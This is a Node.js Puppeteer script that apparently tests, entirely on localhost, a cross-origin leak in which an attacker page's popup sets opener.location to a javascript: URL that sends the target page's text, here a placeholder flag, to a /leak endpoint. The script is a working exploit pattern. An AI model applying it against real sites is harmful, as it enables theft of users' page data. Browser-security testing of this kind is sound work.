const http = require('http');
const puppeteer = require('../../mouse in the house/analysis/browser-lab/node_modules/puppeteer-core');
let hits=[];
const target=http.createServer((q,r)=>{hits.push(q.url);r.end('<h1 id=secret>FLAG123</h1>')}).listen(9131);
const atk=http.createServer((q,r)=>{if(q.url==='/pop')return r.end(`<script>setTimeout(()=>{try{opener.location='javascript:fetch("http://127.0.0.1:9131/leak?"+document.body.innerText)'}catch(e){fetch('/err?'+encodeURIComponent(e))}},1200)</script>`); r.end(`<script>open('/pop');setTimeout(()=>history.back(),300)</script>`)}).listen(9130);
(async()=>{const b=await puppeteer.launch({executablePath:'C:/Program Files/Google/Chrome/Application/chrome.exe',headless:true});const p=await b.newPage();await p.goto('http://localhost:9131/');await p.goto('http://localhost:9130/');await new Promise(r=>setTimeout(r,3000));console.log(hits,await p.url());await b.close();target.close();atk.close()})();
